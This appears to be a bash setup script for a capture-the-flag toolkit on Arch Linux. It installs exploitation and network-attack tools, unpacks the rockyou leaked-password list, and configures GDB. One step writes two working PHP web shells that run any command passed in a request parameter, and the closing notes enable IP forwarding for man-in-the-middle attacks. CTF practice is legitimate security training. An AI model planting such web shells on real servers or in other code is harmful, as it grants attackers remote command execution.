#!/bin/bash
# CTF Arsenal Setup Script for Arch Linux
# Run: bash setup.sh

set -e

echo "=== CTF Arsenal Setup for Arch Linux ==="
echo ""

BASE_DIR="$PWD/ctf-arsenal"

if [ ! -d "$BASE_DIR" ]; then
	echo "Error: Run this script from the directory containing ctf-arsenal/"
	exit 1
fi

echo "[1/7] Installing system packages..."
sudo pacman -S --needed --noconfirm \
	python-pwntools gdb pwndbg gef ropgadget ropper \
	ettercap wireshark-qt nmap socat tcpdump \
	ruby python-requests python-beautifulsoup4 \
	python-scapy python-pycryptodome \
	wget curl git unzip \
	rustup

echo "[2/7] Installing Ruby gems..."
sudo gem install one_gadget seccomp-tools

echo "[3/7] Setting up Python virtual environment..."
cd "$BASE_DIR"
python3 -m venv venv
source venv/bin/activate

pip install --upgrade pip
pip install pwntools requests beautifulsoup4 scapy pycryptodome

echo "[4/7] Downloading static binaries..."
mkdir -p static_bins
cd static_bins

if [ ! -f "busybox-x86_64" ]; then
	wget -q https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox -O busybox-x86_64
	chmod +x busybox-x86_64
	echo "  ✓ Downloaded busybox"
fi

cd "$BASE_DIR"

echo "[5/7] Downloading SecLists wordlists..."
cd 03_web/wordlists

if [ ! -d "SecLists" ]; then
	echo "  Cloning SecLists (this may take a while)..."
	git clone --depth 1 --filter=blob:none --sparse https://github.com/danielmiessler/SecLists.git
	cd SecLists
	git sparse-checkout set Passwords/Leaked-Databases Discovery/Web-Content
	git checkout

	if [ -f "Passwords/Leaked-Databases/rockyou.txt.tar.gz" ]; then
		tar -xzf Passwords/Leaked-Databases/rockyou.txt.tar.gz
		echo "  ✓ Extracted rockyou.txt"
	fi

	cd ..
else
	echo "  SecLists already exists"
fi

cd "$BASE_DIR"

echo "[6/7] Setting up web shells..."
cd 03_web/webshells

cat >php-simple.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF

cat >php-full.php <<'EOF'
<?php
if(isset($_REQUEST['cmd'])) {
    $cmd = ($_REQUEST['cmd']);
    system($cmd." 2>&1");
}
?>
EOF

echo "  ✓ Created PHP web shells"

cd "$BASE_DIR"

echo "[7/7] Setting up GDB configuration..."
cd 01_bin_exploit/gdb_init

cat >gdbinit-pwndbg <<'EOF'
source /usr/share/pwndbg/gdbinit.py
set disassembly-flavor intel
set context-sections regs disasm stack backtrace
EOF

cat >gdbinit-gef <<'EOF'
source /usr/share/gef/gef.py
set disassembly-flavor intel
EOF

echo "  ✓ Created GDB init files"

cd "$BASE_DIR"

echo ""
echo "=== Setup Complete! ==="
echo ""
echo "To use Pwndbg: cp 01_bin_exploit/gdb_init/gdbinit-pwndbg ~/.gdbinit"
echo "To use GEF: cp 01_bin_exploit/gdb_init/gdbinit-gef ~/.gdbinit"
echo ""
echo "Directory structure:"
tree -L 2 -d "$BASE_DIR" 2>/dev/null || find "$BASE_DIR" -type d -maxdepth 2

echo ""
echo "Next steps:"
echo "1. Review cheat_sheets/ for quick reference"
echo "2. Test templates in 00_templates/"
echo "3. Enable IP forwarding for MITM: sudo sysctl -w net.ipv4.ip_forward=1"
